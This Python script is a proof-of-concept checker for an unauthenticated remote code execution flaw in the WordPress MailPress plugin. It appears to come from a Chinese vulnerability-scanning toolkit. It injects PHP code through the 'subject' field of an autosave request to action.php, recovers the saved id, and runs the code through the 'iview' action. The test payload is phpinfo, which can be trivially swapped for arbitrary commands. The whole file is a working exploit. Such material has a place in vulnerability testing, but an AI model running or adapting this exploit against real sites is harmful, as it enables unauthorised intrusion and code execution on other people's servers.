#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress 插件mailpress远程代码执行
referer: http://0day5.com/archives/3960
author: Lucifer
description: Mailpress存在越权调用，在不登陆的情况下，可以调用系统某些方法，造成远程命令执行。
'''
import re
import sys
import json
import requests
import warnings
from termcolor import cprint

class wordpress_plugin_mailpress_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wp-content/plugins/mailpress/mp-includes/action.php"
        vulnurl = self.url + payload
        post_data = {
            "action":"autosave",
            "id":0,
            "revision":-1,
            "toemail":"",
            "toname":"",
            "fromemail":"",
            "fromname":"",
            "to_list":1,
            "Theme":"",
            "subject":"<?php phpinfo();?>", 
            "html":"",
            "plaintext":"",
            "mail_format":"standard",
            "autosave":1,
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            start = req.text.find("<autosave id=")
            end = req.text.find("old_id")
            searchkey = req.text[start:end].strip()
            searchid = searchkey.lstrip("<autosave id='").rstrip("'")
            shellurl = self.url + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id="+searchid
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req2.text:
                cprint("[+]存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wordpress_plugin_mailpress_rce_BaseVerify(sys.argv[1])
    testVuln.run()